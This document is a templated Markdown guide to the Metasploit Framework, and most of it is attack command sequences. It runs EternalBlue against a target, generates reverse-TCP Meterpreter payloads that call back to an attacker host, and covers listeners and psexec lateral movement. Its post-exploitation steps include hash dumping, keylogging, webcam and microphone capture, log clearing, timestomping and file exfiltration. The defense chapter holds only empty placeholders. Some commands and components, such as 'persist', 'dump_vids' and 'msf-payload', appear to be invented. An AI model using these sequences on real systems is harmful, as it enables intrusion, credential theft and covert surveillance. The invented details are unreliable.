---
tool_name: "metasploit-framework"
display_name: "Metasploit Framework"
mitre_tactic: "initial_access"
mitre_tactic_id: "TA0001"
mitre_subcategory: "exploitation"
install_command: "sudo apt install metasploit-framework"
version: "6.4.0"
github_repo: "https://github.com/rapid7/metasploit-framework"
kali_tools_page: "https://www.kali.org/tools/metasploit-framework/"
difficulty_level: "intermediate-to-advanced"
requires_root: false
gui_available: false
tags: ["exploitation", "payloads", "framework", "penetration-testing", "meterpreter"]
related_tools: ["armitage", "msfvenom", "msfconsole"]
---

# Metasploit Framework

## Chapter 1: Introduction & Overview

### What is Metasploit Framework?
Metasploit Framework is the world's most used penetration testing framework. It's a tool for developing and executing exploit code against a remote target machine.

### History & Background
- **Created:** 2003 by H.D. Moore
- **Maintained:** Rapid7
- **License:** Metasploit Framework License
- **Purpose:** Penetration testing framework

Metasploit is the industry standard for penetration testing.

### When to Use This Tool
- **Penetration testing:** Exploit vulnerabilities
- **Red team operations:** Simulate attacks
- **Security assessments:** Test defenses
- **CTF challenges:** Solve exploitation challenges

### Key Concepts
- **Exploit:** Code that takes advantage of a vulnerability
- **Payload:** Code that runs on target after exploitation
- **Meterpreter:** Advanced payload for post-exploitation
- **Auxiliary:** Modules for scanning and enumeration
- **Post:** Post-exploitation modules

### Framework Components
| Component | Description |
|-----------|-------------|
| **msfconsole** | Interactive console |
| **msfvenom** | Payload generator |
| **msfdb** | Database management |
| **msf-exploit** | Exploit modules |
| **msf-payload** | Payload modules |

---

## Chapter 2: Installation & Setup

### System Requirements
- **RAM:** 4 GB minimum (8 GB+ recommended)
- **Disk Space:** 2 GB
- **Ruby:** 3.0+

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install metasploit-framework
```

#### Method 2: From Source
```bash
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install
```

### Configuration

#### Initialize Database
```bash
msfdb init
msfdb status
```

### Verification
```bash
msfconsole --version
```

---

## Chapter 3: Basic Usage

### First Exploitation

#### Start msfconsole
```bash
msfconsole
```
**Explanation:** Opens interactive console.

#### Search for Exploit
```bash
search eternalblue
```
**Explanation:** Searches for exploitation modules.

#### Use Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
**Explanation:** Selects the exploit module.

#### Set Options
```bash
set RHOSTS target_ip
set LHOST attacker_ip
```
**Explanation:** Configures exploit options.

#### Run Exploit
```bash
exploit
```
**Explanation:** Executes the exploit.

### Essential Commands

#### Console Commands
| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show help | `help` |
| `search` | Search modules | `search eternalblue` |
| `use` | Use module | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show options` | Show options | `show options` |
| `set` | Set option | `set RHOSTS 192.168.1.1` |
| `show payloads` | List payloads | `show payloads` |
| `set payload` | Set payload | `set payload windows/x64/meterpreter/reverse_tcp` |
| `exploit` | Run exploit | `exploit` |
| `run` | Run module | `run` |
| `back` | Deselect module | `back` |

#### Database Commands
| Command | Description | Example |
|---------|-------------|---------|
| `db_status` | Database status | `db_status` |
| `hosts` | List hosts | `hosts` |
| `services` | List services | `services` |
| `vulns` | List vulns | `vulns` |
| `creds` | List creds | `creds` |
| `loot` | List loot | `loot` |
| `db_nmap` | Nmap scan | `db_nmap -sV target` |
| `workspace` | Manage workspaces | `workspace -a pentest` |

#### Session Commands
| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List sessions | `sessions` |
| `sessions -i` | Interact | `sessions -i 1` |
| `sessions -k` | Kill session | `sessions -k 1` |
| `sessions -u` | Upgrade shell | `sessions -u 1` |

#### Meterpreter Commands
| Command | Description | Example |
|---------|-------------|---------|
| `sysinfo` | System info | `sysinfo` |
| `getuid` | Current user | `getuid` |
| `getpid` | Current process | `getpid` |
| `ps` | List processes | `ps` |
| `migrate` | Migrate process | `migrate PID` |
| `shell` | Drop to shell | `shell` |
| `download` | Download file | `download /etc/passwd` |
| `upload` | Upload file | `upload payload.exe` |
| `execute` | Execute file | `execute -f cmd.exe` |
| `hashdump` | Dump hashes | `hashdump` |
| `screenshot` | Take screenshot | `screenshot` |
| `keyscan_start` | Start keylogger | `keyscan_start` |
| `keyscan_dump` | Dump keystrokes | `keyscan_dump` |
| `webcam_snap` | Webcam capture | `webcam_snap` |
| `arp` | ARP table | `arp` |
| `ifconfig` | Network interfaces | `ifconfig` |
| `route` | Routing table | `route` |
| `portfwd` | Port forward | `portfwd add -l 8080 -p 80 -r target` |
| `clearev` | Clear event logs | `clearev` |
| `persist` | Install persist | `persist` |
| `shutdown` | Shutdown system | `shutdown` |
| `reboot` | Reboot system | `reboot` |
| `enumdesktops` | Enum desktops | `enumdesktops` |
| `uictl` | Control UI | `uictl enable keyboard` |
| `screenshare` | Screen share | `screenshare` |
| `record_mic` | Record microphone | `record_mic` |
| `dump_vids` | Dump videos | `dump_vids` |
| `timestomp` | Modify timestamps | `timestomp file.exe -m "01/01/2020 00:00:00"` |

### msfvenom Commands

#### Payload Generation
| Command | Description | Example |
|---------|-------------|---------|
| `-p` | Payload | `msfvenom -p windows/meterpreter/reverse_tcp` |
| `LHOST` | Local host | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker` |
| `LPORT` | Local port | `msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444` |
| `-f` | Format | `msfvenom -p windows/meterpreter/reverse_tcp -f exe` |
| `-o` | Output | `msfvenom -p windows/meterpreter/reverse_tcp -o payload.exe` |
| `--list` | List payloads | `msfvenom --list payloads` |
| `--list formats` | List formats | `msfvenom --list formats` |
| `-e` | Encoder | `msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai` |
| `-i` | Iterations | `msfvenom -p windows/meterpreter/reverse_tcp -i 5` |

#### Common Payloads
| Payload | Description | Platform |
|---------|-------------|----------|
| `windows/meterpreter/reverse_tcp` | Reverse TCP | Windows |
| `windows/meterpreter/bind_tcp` | Bind TCP | Windows |
| `windows/shell/reverse_tcp` | Reverse Shell | Windows |
| `linux/x86/meterpreter/reverse_tcp` | Reverse TCP | Linux |
| `linux/x64/meterpreter/reverse_tcp` | Reverse TCP | Linux |
| `python/meterpreter/reverse_tcp` | Reverse TCP | Python |
| `java/meterpreter/reverse_tcp` | Reverse TCP | Java |
| `php/meterpreter/reverse_tcp` | Reverse TCP | PHP |
| `android/meterpreter/reverse_http` | Reverse HTTP | Android |
| `osx/x86/shell_reverse_tcp` | Reverse Shell | macOS |

#### Common Formats
| Format | Description | Extension |
|--------|-------------|-----------|
| `exe` | Windows executable | .exe |
| `elf` | Linux executable | .elf |
| `msi` | Windows installer | .msi |
| `apk` | Android package | .apk |
| `py` | Python script | .py |
| `ps1` | PowerShell script | .ps1 |
| `vba` | VBA macro | .vba |
| `c` | C source | .c |
| `raw` | Raw payload | .bin |

---

## Chapter 4: Intermediate Usage

### Advanced Exploitation

#### Exploit Multi-Handler
```bash
# Start handler
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit -j
```

#### Resource Scripts
```bash
# Create resource script
cat > exploit.rc << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
exploit
EOF

# Run resource script
msfconsole -r exploit.rc
```

### Scripting & Automation

#### Bash Scripting
```bash
#!/bin/bash
# Generate and use payload
LHOST="192.168.1.100"
LPORT="4444"
TARGET="192.168.1.1"

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o payload.exe

# Start handler
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
```

#### Python Scripting
```python
#!/usr/bin/env python3
import subprocess

def generate_payload(payload_type, lhost, lport, output, fmt="exe"):
    """Generate payload with msfvenom"""
    cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {fmt} -o {output}"
    subprocess.run(cmd, shell=True)

# Generate payload
generate_payload("windows/meterpreter/reverse_tcp", "192.168.1.100", "4444", "payload.exe")
```

### Combining with Other Tools

#### With Nmap
```bash
# Scan then exploit
nmap -sV -p 445 target
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
exploit
```

#### With Cracking Tools
```bash
# Dump hashes then crack
hashdump
# Save to file
# Crack with hashcat
hashcat -m 1000 hashes.txt rockyou.txt
```

### Advanced Configurations

#### Database Management
```bash
# Create workspace
workspace -a pentest

# Import nmap results
db_nmap -sV target

# View hosts
hosts

# View services
services
```

### Performance Optimization

#### Parallel Exploitation
```bash
# Run in background
exploit -j

# Check jobs
jobs

# Kill job
jobs -k job_id
```

---

## Chapter 5: Advanced Usage

### Advanced Post-Exploitation

#### Privilege Escalation
```bash
# Check for vulnerabilities
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Use suggested exploit
use exploit/windows/local/ms16_032_secondary_logon
set SESSION 1
exploit
```

#### Lateral Movement
```bash
# Use credentials
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser admin
set SMBPass password
exploit
```

### Integration in Pentest Workflow

#### Phase 1: Reconnaissance
```bash
# Scan target
db_nmap -sV -p- target

# View results
hosts
services
```

#### Phase 2: Exploitation
```bash
# Search for exploits
search eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker
exploit
```

#### Phase 3: Post-Exploitation
```bash
# Get system info
sysinfo

# Dump hashes
hashdump

# Install persistence
persist

# Pivot to other hosts
portfwd add -l 8080 -p 80 -r internal_host
```

### Advanced Configurations

#### Custom Modules
```bash
# Create custom module
# See Metasploit documentation for API

# Load custom module
loadpath /path/to/custom/modules
```

### Performance Optimization

#### Database Optimization
```bash
# Rebuild database
msfdb reinit

# Optimize queries
workspace -a pentest
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge
**Objective:** Get root access

**Steps:**
```bash
# 1. Scan target
db_nmap -sV target

# 2. Search for exploits
search eternalblue

# 3. Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker
exploit

# 4. Post-exploitation
sysinfo
hashdump
```

### Scenario 2: Penetration Test
**Objective:** Compromise network

**Steps:**
```bash
# 1. Scan network
db_nmap -sV 192.168.1.0/24

# 2. Identify vulnerable hosts
services

# 3. Exploit vulnerabilities
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS vulnerable_host
exploit

# 4. Lateral movement
use exploit/windows/smb/psexec
set RHOSTS internal_host
set SMBUser admin
set SMBPass hash
exploit
```

### Scenario 3: Red Team Operation
**Objective:** Full compromise

**Steps:**
```bash
# 1. Reconnaissance
db_nmap -sV -p- target

# 2. Exploitation
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# 3. Post-exploitation
hashdump
portfwd
migrate

# 4. Exfiltration
download sensitive_files/
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect Metasploit

#### Network Indicators
```
# Meterpreter traffic
# Reverse shell connections
# Payload delivery
```

#### Log Analysis
```bash
# Check for Meterpreter
# Monitor for reverse shells
# Detect payload delivery
```

### Mitigation Strategies

#### Network Security
```bash
# Block reverse connections
# Monitor outbound traffic
# Use IDS/IPS
```

#### Endpoint Security
```bash
# Use antivirus
# Monitor process injection
# Block suspicious execution
```

### Blue Team Response
1. **Monitor network traffic** - Detect Meterpreter
2. **Use endpoint protection** - Block payloads
3. **Monitor process injection** - Detect migration
4. **Block reverse connections** - Prevent C2
5. **Regular updates** - Patch vulnerabilities

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Database not connected"
**Cause:** Database not initialized
**Solution:**
```bash
msfdb init
msfconsole
db_status
```

#### Error: "Exploit failed"
**Cause:** Wrong options or target
**Solution:**
```bash
show options
set RHOSTS target
exploit
```

### Performance Optimization

#### Slow Console
```bash
# Use resource scripts
msfconsole -r script.rc

# Use batch mode
msfconsole -x "use exploit; set options; exploit"
```

### FAQ

**Q: Is Metasploit legal to use?**
A: Yes, Metasploit is a legitimate security testing tool. However, using it for unauthorized attacks is illegal. Always get written permission before testing.

**Q: How do I update Metasploit?**
A: `sudo apt update && sudo apt upgrade metasploit-framework`

**Q: What's the difference between Meterpreter and shell?**
A: Meterpreter is more powerful with file system access, registry manipulation, and persistence. Shell is basic command execution.

**Q: How do I create custom payloads?**
A: Use msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe`

**Q: Can I use Metasploit for web testing?**
A: Yes, Metasploit includes web exploitation modules.

---

## Resources

### Official Documentation
- [Metasploit Homepage](https://www.metasploit.com/)
- [GitHub Repository](https://github.com/rapid7/metasploit-framework)
- [Metasploit Documentation](https://docs.metasploit.com/)

### Tutorials
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploit Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit.md)

### Related Tools
- **Armitage:** GUI for Metasploit
- **MSFvenom:** Payload generator
- **MSFconsole:** Interactive console
- **MSFDB:** Database management

### Practice Resources
- [Metasploitable](https://sourceforge.net/projects/metasploitable/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
